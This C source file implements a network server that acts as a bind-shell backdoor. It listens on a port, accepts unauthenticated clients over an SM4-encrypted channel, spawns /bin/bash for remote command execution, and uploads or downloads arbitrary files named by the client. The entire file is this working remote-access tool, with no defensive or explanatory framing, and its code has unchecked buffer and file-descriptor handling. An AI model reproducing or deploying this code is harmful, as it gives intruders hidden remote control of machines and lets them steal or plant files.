//
// Created by kobe1 on 8/28/22.
//
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/epoll.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <fcntl.h>
#include "sm4.h"
#define CON_MAX 1024
struct  epoll_event events[CON_MAX];
int epoll_fd;
char send_buffer[BUFSIZ];
int read_pipes[2];
int write_pipes[2];
int event_add(int fd)
{
    struct epoll_event event;
    memset(&event,0,sizeof(event));
    event.data.fd = fd;
    event.events = EPOLLIN;
    if(epoll_ctl(epoll_fd,EPOLL_CTL_ADD,fd,&event) == -1)
    {
        return -1;
    }
    return 0;
}
void run_shell(int client_fd,char *tp)
{
    char buf[1024];
    sprintf(buf,"%s\n",tp);
    char temp[1024];
    if( !strcmp(buf,"shell\n"))
    {
        int fork_result = fork();
        if(fork_result == 0)
        {
            close(0);
            close(1);
            close(2);
            dup2(read_pipes[0],STDIN_FILENO);
            dup2(write_pipes[1],STDERR_FILENO);
            dup2(write_pipes[1],STDOUT_FILENO);
            execl("/bin/bash", "bash", (char *) 0);
        }
    }
    else
    {
        write(read_pipes[1],buf,strlen(buf));
        usleep(5000);
        memset(send_buffer,0,sizeof(send_buffer));
        memset(temp,0,sizeof(temp));
        int ret = read(write_pipes[0],send_buffer,sizeof(send_buffer));
        if(ret> 0 )
        {
            sm4e(send_buffer,temp,1024);
            write(client_fd,temp,1024);
            printf("%s",send_buffer);
            fflush(stdout);
        }
    }
}
void upload(int send_fd,char *file_name)
{
    char buffer[1024];
    FILE *fp = fopen(file_name, "w");
    if (fp == NULL)
    {
        printf("File: %s Can Not Open To Write!\n", file_name);
    }
    else{
        memset(buffer,0, sizeof(buffer));
        int length = 0;
        fcntl(send_fd,F_SETFL,FNDELAY);
        usleep(90000);
        while((length = read(send_fd, buffer, sizeof(buffer))) >=0)
        {
            int write_length = fwrite(buffer, 1, length, fp);
            memset(buffer,0, sizeof(buffer));
        }

        fclose(fp);
        printf("Recieve File: %s From client Finished!\n", file_name);
    }

}
void downLoad(int send_fd , char *file_name)
{
    char file[1024];
    FILE *fd = fopen(file_name, "r");
    if(fd != NULL) {
        int ret;
        memset(file, 0, sizeof(file));
        usleep(1000);
        fcntl(send_fd, F_SETFL, 0);
        while ((ret = fread(file, 1, 1024, fd)) > 0) {
            write(send_fd, file, ret);
            memset(file, 0, 1024);
        }
        fclose(fd);
    }

}
int server_port( short int port) {
    struct sockaddr_in server_addr;
    struct sockaddr_in  addr;
    socklen_t addr_length;
    char buf[1024];
    char read_buf[1024];
    char temp[1024];
    socklen_t server_addr_len;
    int listen_fd,events_count;
    pid_t fork_result;
    int flag[1024]={0};
    unsigned short listen_port = port;
    pipe(read_pipes);
    pipe(write_pipes);
    fcntl(write_pipes[0],F_SETFL,FNDELAY);
    if ((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "create sockets err!");
        return -1;
    }
    int opt = 1;
    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) == -1)
    {
        fprintf(stderr,"set sockets err!\n");
        close(listen_fd);
        return -1;
    }
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(listen_port);
    server_addr.sin_family = AF_INET;
    server_addr_len = sizeof(server_addr);
    if(bind(listen_fd,(struct  sockaddr *) &server_addr,server_addr_len) < 0)
    {
        fprintf(stderr,"bind sockets error!\n");
        close(listen_fd);
        return -1;
    }
    if(listen(listen_fd,SOMAXCONN) < 0)
    {
        fprintf(stderr,"listen sockets err!\n");
        close(listen_fd);
        return -1;
    }
    if((epoll_fd = epoll_create(CON_MAX)) == -1)
    {
        fprintf(stderr,"epoll create error!\n");
        return -1;
    }
    event_add(listen_fd);
    addr_length = sizeof(addr);
    int client_fd;
    while(1)
    {
        if((events_count = epoll_wait(epoll_fd,events,CON_MAX,-1)) < 0)
        {
            fprintf(stderr,"wait error!!!");
        }
        for(int i = 0; i < events_count ; i++)
        {
            client_fd = events[i].data.fd;
            if(events[i].events & (EPOLLHUP | EPOLLERR))
            {
                fprintf(stderr, "Client disconnected (socket %d).\n", client_fd);
                epoll_ctl(epoll_fd,EPOLL_CTL_DEL,client_fd,NULL);
                close(client_fd);
            }
            else if(client_fd == listen_fd)
            {
                if((client_fd = accept(listen_fd, (struct sockaddr *)&addr, &addr_length)) == -1)
                {
                    fprintf(stderr, "Unable to accept new client connection.\n");
                    continue;
                }
                if(event_add(client_fd) == -1)
                {
                    fprintf(stderr, "Unable to add soecket to Epoll event queue, closing (socket %d).\n", client_fd);
                    close(client_fd);
                    continue;
                }
                fprintf(stdout, "New client connection from %s (socket %d).\n", inet_ntoa(addr.sin_addr), client_fd);
            }
            else if(events[i].events & EPOLLIN)
            {
                memset(temp,0,sizeof(temp));
                memset(buf,0,sizeof(buf));
                int ret = read(client_fd,temp,sizeof(temp));
                sm4d(temp,buf,ret);
                if (ret > 0){
                    switch (flag[client_fd]) {
                        case 1:
                            if(!strcmp(buf,"exit"))
                            {
                                flag[client_fd] = 0;
                            }
                            run_shell(client_fd,buf);
                            break;
                        case 2:
                            if(!strcmp(buf,"exit"))
                            {
                                flag[client_fd] = 0;
                                break;
                            }
                            else
                            {
                                upload(client_fd,buf);
                            }
                            break;
                        case 3:
                            if(!strcmp(buf,"exit"))
                                flag[client_fd]= 0;
                            else
                            {
                                downLoad(client_fd,buf);
                            }
                            break;
                    }
                    if(!strcmp(buf,"shell"))
                    {
                        flag[client_fd] = 1;
                        run_shell(client_fd,buf);
                    }
                    else if(!strcmp(buf,"upload"))
                    {
                        flag[client_fd] = 2;
                    }
                    else if(!strcmp(buf,"download"))
                    {
                        flag[client_fd] = 3;
                    }

                }
                else
                {
                    close(client_fd);
                    if(flag[client_fd] == 1)
                    {
                        write(read_pipes[1],"exit\n",6);
                    }
                    flag[client_fd] = 0;
                }
            }
        }
    }
    return 0;
}
